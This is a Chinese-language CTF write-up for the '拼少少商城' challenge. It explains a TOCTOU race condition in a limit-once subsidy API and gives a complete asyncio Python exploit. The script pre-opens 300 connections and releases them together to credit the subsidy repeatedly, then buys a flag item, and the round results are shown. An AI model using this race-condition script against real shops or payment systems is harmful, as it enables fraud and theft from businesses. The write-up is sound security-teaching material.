---
title: 乌托邦·王的实验室24——拼少少商城 Writeup
contest: 乌托邦·王的实验室 24
year: 2024
difficulty: medium
vuln_type: logic
tags: [TOCTOU, asyncio, asyncio.open_connection, asyncio.Event, 并发竞态, 补贴接口, 抢购]
attack_chain:
  - 靶机提供 /api/user /api/catalog /api/subsidy /api/order /api/dialogue 接口
  - /api/subsidy 限领一次，但服务端检查 TOCTOU 漏洞
  - 同一 session 用 300 个 TCP 连接预建立
  - asyncio.open_connection 预热 + asyncio.Event 同步触发
  - event.set() 同时发送 300 个 POST /api/subsidy
  - 余额达 10000 后 POST /api/order 买 p_1004
  - 响应中含 flag
key_payload: 'asyncio.open_connection + asyncio.Event + race_subsidy(cookie, n=300)'
one_liner: asyncio 300 个 TCP 并发触发补贴接口 TOCTOU 漏洞刷钱买 10000 特供商品拿 flag。
lesson: TOCTOU 漏洞在状态机类业务接口（限领/限购/限次）中常出现；asyncio 预建连接 + Event 同步触发是高并发竞态标准姿势；asyncio.wait_for(reader.read) 必须加 timeout 否则协程卡死。
quality: medium
---

# 乌托邦·王的实验室24——拼少少商城 Writeup

## 概览
- **来源**: ctfiot 299471
- **赛事**: 乌托邦·王的实验室 24
- **类型**: Web 业务逻辑 + 并发竞态

## 题目描述
- 顶部: 用户名 + 余额（初始 0）
- "百亿补贴"按钮：+100 购物金，**限领一次**
- 商品列表: "特供：乌托邦的秘密" 价格 10000 库存 1
- 右侧: 三三和乌托邦·王的剧情对话

## API
- `GET /api/user` - 用户信息 (username, balance, level)
- `GET /api/catalog` - 商品列表
- `POST /api/subsidy` - 领补贴 (+100, 限一次)
- `POST /api/order` - 购买 (product_id, signature)
- `GET /api/dialogue` - 剧情对话

## EXP (asyncio 预热并发)
```python
import asyncio, requests
from urllib.parse import urlparse

TARGET = "http://host:port"
parsed = urlparse(TARGET)
HOST, PORT = parsed.hostname, parsed.port or 80

def get_session():
    s = requests.Session()
    s.get(TARGET, timeout=15)
    return s

def build_request(cookie):
    return (f"POST /api/subsidy HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Cookie: pss_enterprise_session={cookie}\r\n"
            f"Content-Length: 0\r\n"
            f"Connection: close\r\n\r\n").encode()

async def send_one(event, req_bytes):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(HOST, PORT), timeout=10)
        await event.wait()
        writer.write(req_bytes)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(4096), timeout=15)
        writer.close()
        return '"code": 200' in data.decode(errors="ignore")
    except:
        return False

async def race_subsidy(cookie, n=300):
    event = asyncio.Event()
    req = build_request(cookie)
    tasks = [asyncio.create_task(send_one(event, req)) for _ in range(n)]
    await asyncio.sleep(1)
    event.set()  # 同时触发 300 个请求
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r)

async def main():
    for attempt in range(20):
        session = get_session()
        cookie = session.cookies.get("pss_enterprise_session")
        success = await race_subsidy(cookie, 300)
        balance = session.get(TARGET + "/api/user").json()["data"]["balance"]
        print(f"[Round {attempt+1}] success={success}, balance={balance}")
        if balance >= 10000:
            r = session.post(TARGET + "/api/order",
                json={"product_id": "p_1004", "signature": "token-validated"})
            print(f"[+] Order: {r.json()}")
            if r.json().get("flag"):
                print(f"[+] FLAG: {r.json()['flag']}")
                return
```

## 效果
- Round 1: success=18, balance=1800
- Round 2: success=83, balance=8300
- Round 3: success=163, balance=16300 (起飞)
